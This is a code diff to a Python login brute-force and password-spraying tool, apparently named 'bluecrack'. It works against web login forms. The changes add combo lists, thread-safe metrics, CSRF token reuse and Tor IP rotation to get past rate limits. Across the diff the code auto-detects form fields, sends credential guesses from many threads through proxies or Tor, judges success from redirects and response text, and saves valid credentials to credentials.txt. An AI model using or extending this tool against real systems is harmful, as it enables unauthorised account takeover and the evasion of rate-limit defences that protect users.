@@ -22,7 +22,7 @@ import requests
 
 from .constants import DEFAULT_USER_AGENTS
 from .session import SessionManager
-from .utils import save_json_report
+from .utils import change_tor_ip, save_json_report
 
 # ═══════════════════════════════════════════════════════════════════
 # HTML FORM PARSER — auto-detects form fields from login pages
@@ -225,7 +225,17 @@ class HTTPAttackEngine:
         self._attack_thread: Optional[threading.Thread] = None
 
         # Metrics
-        self.metrics: Dict[str, int] = {}
+        self.metrics: Dict[str, int] = {
+            "attempted": 0,
+            "successes": 0,
+            "failures": 0,
+            "errors": 0,
+            "rate_limit_hits": 0,
+            "skipped_empty": 0,
+            "skipped_solved_user": 0,
+            "requeued": 0,
+            "rate_retry_exhausted": 0,
+        }
         self._metrics_lock = threading.Lock()
         self._last_metrics_emit: float = 0.0
 
@@ -274,20 +284,21 @@ class HTTPAttackEngine:
             self._progress_callback(current, total)
 
     def _build_metrics_snapshot(self) -> Dict[str, Any]:
-        m = dict(self.metrics)
+        with self._metrics_lock:
+            m = dict(self.metrics)
         elapsed = time.time() - self._start_time if self._start_time else 0
         m["elapsed"] = elapsed
         speed = 0.0
         if elapsed > 0:
-            speed = self.metrics.get("attempted", 0) / elapsed
+            speed = m.get("attempted", 0) / elapsed
         m["speed"] = speed
-        eta = 0
+        eta = 0.0
         total = getattr(self, "total", 0)
         if speed > 0 and total:
-            left = total - self.metrics.get("attempted", 0)
+            left = max(0, total - m.get("attempted", 0))
             eta = left / speed
         m["eta"] = eta
-        m["hits"] = self.metrics.get("successes", 0)
+        m["hits"] = m.get("successes", 0)
         return m
 
     def _emit_metrics(self, force: bool = False) -> None:
@@ -344,26 +355,31 @@ class HTTPAttackEngine:
         self._stop_flag.clear()
         self._global_stop.clear()
         self._found_event.clear()
-        self._found_users.clear()
-        self._found_creds.clear()
-        self._logs.clear()
+        with self._found_lock:
+            self._found_users.clear()
+            self._found_creds.clear()
+        with self._logs_lock:
+            self._logs.clear()
         self._running = True
         self._start_time = time.time()
-        self.total = len(ctx.get("users", [])) * len(ctx.get("passwords", []))
+        self._target_url = ctx.get("target_url", "")
+        if "combos" in ctx and ctx["combos"]:
+            self.total = len(ctx["combos"])
         self._session_mgr = SessionManager() if ctx.get("enable_session", True) else None
         self._ctx = ctx
 
-        self.metrics = {
-            "attempted": 0,
-            "successes": 0,
-            "failures": 0,
-            "errors": 0,
-            "rate_limit_hits": 0,
-            "skipped_empty": 0,
-            "skipped_solved_user": 0,
-            "requeued": 0,
-            "rate_retry_exhausted": 0,
-        }
+        with self._metrics_lock:
+            self.metrics = {
+                "attempted": 0,
+                "successes": 0,
+                "failures": 0,
+                "errors": 0,
+                "rate_limit_hits": 0,
+                "skipped_empty": 0,
+                "skipped_solved_user": 0,
+                "requeued": 0,
+                "rate_retry_exhausted": 0,
+            }
 
         self._attack_thread = threading.Thread(
             target=self._run_attack, args=(ctx,), daemon=True
@@ -375,16 +391,19 @@ class HTTPAttackEngine:
     def _run_attack(self, ctx: Dict[str, Any]) -> None:
         """Main HTTP attack loop."""
         import random
-
         try:
-            users: List[str] = ctx["users"]
-            passwords: List[str] = ctx["passwords"]
-            total: int = len(users) * len(passwords)
+            users: List[str] = ctx.get("users", [])
+            passwords: List[str] = ctx.get("passwords", [])
+            if "combos" in ctx and ctx["combos"]:
+                total = len(ctx["combos"])
+            else:
+                total = len(users) * len(passwords)
+            self.total = total
             threads: int = ctx.get("threads", 4)
             done_count: List[int] = [0]
             done_lock = threading.Lock()
             multiple_users: bool = len(users) > 1
-            success_msg: str = ctx.get("success_msg", "").lower().strip()
+            success_msg: str = (ctx.get("success_msg") or "").lower().strip()
             error_msg_lower: str = (ctx.get("error_msg") or "").lower().strip()
             limit_text: str = (ctx.get("limit_text") or "").lower().strip()
             max_attempts: int = ctx.get("max_attempts", 0)
@@ -417,13 +436,17 @@ class HTTPAttackEngine:
             try:
                 probe_resp = probe_session.get(target_url, timeout=15)
                 probe_resp.raise_for_status()
+                page_html = probe_resp.text
             except Exception as e:
                 self._log(f"[-] Failed to reach {target_url}: {e}")
                 if self._finished_callback:
                     self._finished_callback(False, f"Cannot reach target: {e}")
                 return
-
-            page_html = probe_resp.text
+            finally:
+                try:
+                    probe_session.close()
+                except Exception:
+                    pass
 
             # Auto-detect or use user-provided field names
             form_action = ctx.get("form_action", "")
@@ -441,15 +464,12 @@ class HTTPAttackEngine:
                         username_field = detected["username_field"]
                     if not password_field:
                         password_field = detected["password_field"]
-                    # Merge auto-detected hidden fields (user-supplied take priority)
                     for k, v in detected["extra_fields"].items():
                         if k not in extra_fields:
                             extra_fields[k] = v
                     self._log(f"[+] Auto-detected form action: {form_action}")
                     self._log(f"[+] Auto-detected username field: {username_field}")
                     self._log(f"[+] Auto-detected password field: {password_field}")
-                    if extra_fields:
-                        self._log(f"[+] Hidden fields: {list(extra_fields.keys())}")
                 except ValueError as e:
                     self._log(f"[-] Form detection failed: {e}")
                     if self._finished_callback:
@@ -459,19 +479,14 @@ class HTTPAttackEngine:
             if not form_action:
                 form_action = target_url
 
-            # Check for CSRF token
             csrf_token = _extract_csrf_token(page_html, csrf_field or None)
             if csrf_token and csrf_field:
                 extra_fields[csrf_field] = csrf_token
-                self._log(f"[+] CSRF token extracted: {csrf_field}={csrf_token[:16]}...")
             elif csrf_token:
-                # Try to find the field name from extra_fields
                 for k, v in extra_fields.items():
                     if v == csrf_token:
                         csrf_field = k
                         break
-
-            probe_session.close()
 
             self._log(f"[*] POST → {form_action}")
             self._log(f"[*] Fields: {username_field}=<user>, {password_field}=<pass>")
@@ -483,7 +498,10 @@ class HTTPAttackEngine:
             spray_mode = ctx.get("spray_mode", False)
 
             def populate() -> None:
-                if spray_mode:
+                if "combos" in ctx and ctx["combos"]:
+                    for u, p in ctx["combos"]:
+                        q.put((u, p))
+                elif spray_mode:
                     for p in passwords:
                         for u in users:
                             q.put((u, p))
@@ -494,6 +512,32 @@ class HTTPAttackEngine:
 
             threading.Thread(target=populate, daemon=True).start()
 
+            def _step_progress() -> None:
+                with done_lock:
+                    done_count[0] += 1
+                    cur = done_count[0]
+                self._emit_progress(cur, total)
+                q.task_done()
+                self._emit_metrics()
+                if (
+                    self._session_mgr
+                    and self._session_mgr.auto_save_interval > 0
+                    and cur % self._session_mgr.auto_save_interval == 0
+                ):
+                    remaining = []
+                    try:
+                        with q.mutex:
+                            remaining = list(q.queue)
+                    except Exception:
+                        pass
+                    with self._metrics_lock:
+                        m_copy = dict(self.metrics)
+                    with self._found_lock:
+                        fc_copy = list(self._found_creds)
+                    self._session_mgr.save_state(
+                        self._ctx, remaining, m_copy, fc_copy
+                    )
+
             # ── Step 3: Worker function ────────────────────────────
             def _http_worker() -> None:
                 session = requests.Session()
@@ -503,77 +547,59 @@ class HTTPAttackEngine:
                 })
                 if custom_cookies:
                     session.cookies.update(custom_cookies)
-
-                # Apply proxy if available
                 proxy_list = ctx.get("proxies", [])
                 if proxy_list:
                     proxy_url = random.choice(proxy_list)
                     session.proxies = {"http": proxy_url, "https": proxy_url}
-
-                # Dynamically set timeout based on proxies or Tor usage (Tor needs more time)
                 use_tor = ctx.get("use_tor", False)
                 conn_timeout = 30 if (use_tor or proxy_list) else 15
-
-                # ── Establish initial session cookies ──
+                current_csrf_token = extra_fields.get(csrf_field, "") if csrf_field else ""
                 try:
                     init_resp = session.get(target_url, timeout=conn_timeout)
-                    # Extract initial CSRF token if present
                     if csrf_field:
                         init_token = _extract_csrf_token(init_resp.text, csrf_field)
                         if init_token:
-                            extra_fields[csrf_field] = init_token
+                            current_csrf_token = init_token
                 except Exception as e:
                     self._log(f"[!] Warning: initial session establishment failed: {e}")
 
-                # Track current CSRF token val locally to avoid repetitive GETs
-                current_csrf_token = extra_fields.get(csrf_field, "") if csrf_field else ""
-
                 try:
                     while (
-                        not q.empty()
-                        and not self._stop_flag.is_set()
+                        not self._stop_flag.is_set()
                         and not self._global_stop.is_set()
                     ):
-                        # Check max attempts
                         if max_attempts > 0:
                             with self._metrics_lock:
                                 if self.metrics["attempted"] >= max_attempts:
                                     break
-
-                        # Check if we should stop (non-continue mode)
-                        if not continue_after:
-                            if not multiple_users and self._found_users:
-                                break
-
+                        if not continue_after and not multiple_users:
+                            with self._found_lock:
+                                if self._found_users:
+                                    break
                         try:
                             user, pwd = q.get(timeout=0.5)
                         except Exception:
-                            break
-
+                            if q.empty():
+                                break
+                            continue
                         if not pwd or not pwd.strip():
                             with self._metrics_lock:
                                 self.metrics["skipped_empty"] += 1
-                            q.task_done()
+                            _step_progress()
                             continue
-
-                        if not continue_after and user in self._found_users:
-                            with self._metrics_lock:
-                                self.metrics["skipped_solved_user"] += 1
-                            with done_lock:
-                                done_count[0] += 1
-                            self._emit_progress(done_count[0], total)
-                            q.task_done()
-                            continue
-
+                        if not continue_after:
+                            with self._found_lock:
+                                if user in self._found_users:
+                                    with self._metrics_lock:
+                                        self.metrics["skipped_solved_user"] += 1
+                                    _step_progress()
+                                    continue
                         try:
-                            # Apply delay + jitter
                             actual_delay = delay
                             if jitter > 0:
                                 actual_delay += random.uniform(0, jitter)
                             if actual_delay > 0:
                                 time.sleep(actual_delay)
-
-                            # Fetch fresh CSRF token ONLY if we lost it
                             current_extra = dict(extra_fields)
                             if csrf_field:
                                 if not current_csrf_token:
@@ -587,76 +613,56 @@ class HTTPAttackEngine:
                                     except Exception:
                                         pass
                                 current_extra[csrf_field] = current_csrf_token
-
-                            # Build POST data / payload
                             payload_data = {
+                                **current_extra,
                                 username_field: user,
                                 password_field: pwd,
-                                **current_extra,
                             }
-
-                            # Send POST request (JSON or Form URL encoded)
+                            with self._metrics_lock:
+                                self.metrics["attempted"] += 1
+                            self._log(f"[*] Trying (HTTP): {user} / {pwd}")
                             if json_mode:
                                 resp = session.post(
                                     form_action,
                                     json=payload_data,
                                     allow_redirects=follow_redirects,
-                                    timeout=15,
+                                    timeout=conn_timeout,
                                 )
                             else:
                                 resp = session.post(
                                     form_action,
                                     data=payload_data,
                                     allow_redirects=follow_redirects,
-                                    timeout=15,
+                                    timeout=conn_timeout,
                                 )
-
-                            with self._metrics_lock:
-                                self.metrics["attempted"] += 1
-
                             resp_text = resp.text.lower()
-                            resp_url = resp.url if follow_redirects else ""
+                            resp_url = resp.url.lower()
                             status_code = resp.status_code
-
-                            # Try to extract the next CSRF token from the POST response itself
-                            if csrf_field:
-                                next_token = _extract_csrf_token(resp.text, csrf_field)
-                                if next_token:
-                                    current_csrf_token = next_token
-                                else:
-                                    current_csrf_token = ""  # Reset to force GET next loop
-
-                            self._log(f"[*] Trying: {user} / {pwd} (Status: {status_code})")
-
-                            # ── Rate limit check ──
-                            if limit_text and limit_text in resp_text:
-                                self._log("[!] Rate limit hit!")
+                            is_rate_limited = False
+                            if status_code == 429:
+                                is_rate_limited = True
+                            elif limit_text and limit_text in resp_text:
+                                is_rate_limited = True
+                            if is_rate_limited:
+                                self._log(f"[!] Rate limit hit for {user}/{pwd} (HTTP {status_code})")
                                 with self._metrics_lock:
                                     self.metrics["rate_limit_hits"] += 1
-
                                 combo_key = (user, pwd)
                                 with retry_lock:
-                                    retry_budget[combo_key] = (
-                                        retry_budget.get(combo_key, 0) + 1
-                                    )
-                                    budget_exceeded = (
-                                        retry_budget[combo_key]
-                                        > MAX_RETRIES_PER_COMBO
-                                    )
-
+                                    retry_budget[combo_key] = retry_budget.get(combo_key, 0) + 1
+                                    budget_exceeded = retry_budget[combo_key] > MAX_RETRIES_PER_COMBO
                                 if budget_exceeded:
-                                    self._log(
-                                        f"[!] Retry budget exhausted for {user}/{pwd}"
-                                    )
+                                    self._log(f"[!] Retry budget exhausted for {user}/{pwd}. Dropping combo.")
                                     with self._metrics_lock:
                                         self.metrics["rate_retry_exhausted"] += 1
-                                    with done_lock:
-                                        done_count[0] += 1
-                                    self._emit_progress(done_count[0], total)
-                                    q.task_done()
+                                    _step_progress()
                                     continue
-
-                                if cooldown > 0:
+                                if use_tor:
+                                    self._log("[~] Shifting Tor IP...")
+                                    change_tor_ip(ctx.get("tor_port", 9051))
+                                    time.sleep(3)
+                                elif cooldown > 0:
+                                    self._log(f"[~] Cooling down for {cooldown}s...")
                                     time.sleep(cooldown)
                                 q.put((user, pwd))
                                 with self._metrics_lock:
@@ -664,92 +670,46 @@ class HTTPAttackEngine:
                                 q.task_done()
                                 self._emit_metrics()
                                 continue
-
-                            # ── Status code explicit failure check ──
                             if failure_status_codes and status_code in failure_status_codes:
                                 with self._metrics_lock:
                                     self.metrics["failures"] += 1
-                                with done_lock:
-                                    done_count[0] += 1
-                                self._emit_progress(done_count[0], total)
-                                q.task_done()
-                                self._emit_metrics()
+                                _step_progress()
                                 continue
-
-                            # ── Error text check ──
-                            if error_msg_lower and error_msg_lower in resp_text:
-                                with self._metrics_lock:
-                                    self.metrics["failures"] += 1
-                                with done_lock:
-                                    done_count[0] += 1
-                                self._emit_progress(done_count[0], total)
-                                q.task_done()
-                                self._emit_metrics()
-                                continue
-
-                            # ── Determine success (Fallback indicator chain) ──
                             is_success = False
-
-                            # 0. Explicit Success Status Code match
                             if success_status_codes and status_code in success_status_codes:
                                 is_success = True
-
-                            # 1. Success Message match
-                            if success_msg and success_msg in resp_text:
+                            if not is_success and error_msg_lower and error_msg_lower in resp_text:
+                                with self._metrics_lock:
+                                    self.metrics["failures"] += 1
+                                _step_progress()
+                                continue
+                            if not is_success and success_msg and success_msg in resp_text:
                                 is_success = True
-
-                            # 2. Redirect indicates success (e.g. 302 to a dashboard page)
-                            if not is_success and status_code in (301, 302, 303, 307, 308):
-                                redirect_loc = (resp.headers.get("Location") or "").lower()
-                                if redirect_loc and "login" not in redirect_loc and "error" not in redirect_loc:
-                                    self._log(f"[~] Successful redirect detected -> {redirect_loc}")
-                                    is_success = True
-
-                            # 3. Followed redirects landed on a non-login authenticated URL
+                            if not is_success and not follow_redirects:
+                                if status_code in (301, 302, 303, 307, 308):
+                                    loc = resp.headers.get("Location", "").lower()
+                                    if loc and "login" not in loc and "auth" not in loc:
+                                        is_success = True
                             if not is_success and follow_redirects and resp_url:
-                                if (
-                                    resp_url != target_url
-                                    and resp_url != form_action
-                                    and "login" not in resp_url.lower()
-                                    and "error" not in resp_url.lower()
-                                ):
-                                    self._log(f"[~] Redirect followed successfully -> {resp_url}")
+                                if resp_url != target_url.lower() and "login" not in resp_url:
                                     is_success = True
-
-                            # 4. Error String absent (only if error string was set and not found, and no 4xx/5xx error occurred)
-                            if not is_success and error_msg_lower and (status_code >= 200 and status_code < 300):
-                                if error_msg_lower not in resp_text:
+                            if not is_success and error_msg_lower and (200 <= status_code < 300):
+                                if resp_text and error_msg_lower not in resp_text:
                                     is_success = True
-
                             if is_success:
                                 with self._found_lock:
                                     self._found_users.add(user)
                                     self._found_creds.append((user, pwd))
-                                self._log(
-                                    f"\n[+] VALID CREDENTIALS: {user} / {pwd}"
-                                )
+                                self._log(f"\n[+] VALID CREDENTIALS: {user} / {pwd}")
                                 with self._metrics_lock:
                                     self.metrics["successes"] += 1
                                 try:
                                     entry = f"{user}:{pwd}\n"
-                                    with self._found_lock:
-                                        existing = set()
-                                        try:
-                                            with open(
-                                                "credentials.txt", "r", encoding="utf-8"
-                                            ) as rf:
-                                                existing = set(rf.readlines())
-                                        except FileNotFoundError:
-                                            pass
-                                        if entry not in existing:
-                                            with open(
-                                                "credentials.txt", "a", encoding="utf-8"
-                                            ) as cf:
-                                                cf.write(entry)
+                                    with open("credentials.txt", "a", encoding="utf-8") as cf:
+                                        cf.write(entry)
                                 except Exception:
                                     pass
-
-                                if "notifier" in ctx:
+                                if "notifier" in ctx and ctx["notifier"]:
                                     try:
                                         ctx["notifier"].notify(
                                             "credential_found",
@@ -761,92 +721,42 @@ class HTTPAttackEngine:
                                         )
                                     except Exception:
                                         pass
-
-                                with done_lock:
-                                    done_count[0] += 1
-                                self._emit_progress(done_count[0], total)
-                                q.task_done()
-                                self._emit_metrics()
-
-                                # Auto-save session periodically
-                                if self._session_mgr and done_count[0] % self._session_mgr.auto_save_interval == 0:
-                                    remaining = []
-                                    try:
-                                        with q.mutex:
-                                            remaining = list(q.queue)
-                                    except Exception:
-                                        pass
-                                    self._session_mgr.save_state(
-                                        self._ctx, remaining, dict(self.metrics),
-                                        list(self._found_creds),
-                                    )
-
+                                _step_progress()
                                 if not continue_after and not multiple_users:
                                     with q.mutex:
                                         q.queue.clear()
                                     break
-
-                                # Reset session for clean state (new cookies)
                                 session.cookies.clear()
                                 current_csrf_token = ""
                                 continue
                             else:
                                 with self._metrics_lock:
                                     self.metrics["failures"] += 1
-
-                            with done_lock:
-                                done_count[0] += 1
-                            self._emit_progress(done_count[0], total)
-                            q.task_done()
-                            self._emit_metrics()
-
-                            # Auto-save session periodically
-                            if self._session_mgr and done_count[0] % self._session_mgr.auto_save_interval == 0:
-                                remaining = []
-                                try:
-                                    with q.mutex:
-                                        remaining = list(q.queue)
-                                except Exception:
-                                    pass
-                                self._session_mgr.save_state(
-                                    self._ctx, remaining, dict(self.metrics),
-                                    list(self._found_creds),
-                                )
-
+                                _step_progress()
                         except requests.exceptions.RequestException as e:
                             self._log(f"[-] Network error: {e}. Requeuing {user}/{pwd}...")
                             with self._metrics_lock:
                                 self.metrics["errors"] += 1
-
                             combo_key = (user, pwd)
                             with retry_lock:
                                 retry_budget[combo_key] = retry_budget.get(combo_key, 0) + 1
                                 budget_exceeded = retry_budget[combo_key] > MAX_RETRIES_PER_COMBO
-
                             if budget_exceeded:
                                 self._log(f"[!] Retry budget exceeded for {user}/{pwd} due to network errors. Dropping combo.")
-                                with done_lock:
-                                    done_count[0] += 1
-                                self._emit_progress(done_count[0], total)
-                                q.task_done()
+                                _step_progress()
                             else:
-                                # Put it back to retry later
                                 q.put((user, pwd))
                                 with self._metrics_lock:
                                     self.metrics["requeued"] += 1
                                 q.task_done()
                                 self._emit_metrics()
-                                time.sleep(2)  # Wait 2 seconds to let Tor/proxy cool down
+                                time.sleep(2)
                             continue
                         except Exception as ex:
                             self._log(f"[-] Worker error: {ex}")
                             with self._metrics_lock:
                                 self.metrics["errors"] += 1
-                            with done_lock:
-                                done_count[0] += 1
-                            self._emit_progress(done_count[0], total)
-                            q.task_done()
-                            self._emit_metrics()
+                            _step_progress()
                 finally:
                     session.close()
 
@@ -856,22 +766,17 @@ class HTTPAttackEngine:
                 t = threading.Thread(target=_http_worker, daemon=True)
                 t.start()
                 workers.append(t)
-
             for t in workers:
                 t.join()
-
             end_time = time.time()
-
-            # Auto-save JSON report
             save_json_report(
                 "bluecrack_report.json",
                 target_url,
-                self.metrics,
-                self._found_creds,
+                self.get_metrics(),
+                self.get_found_creds(),
                 self._start_time,
                 end_time,
             )
-
             self._emit_metrics(force=True)
 
             if self._found_users:
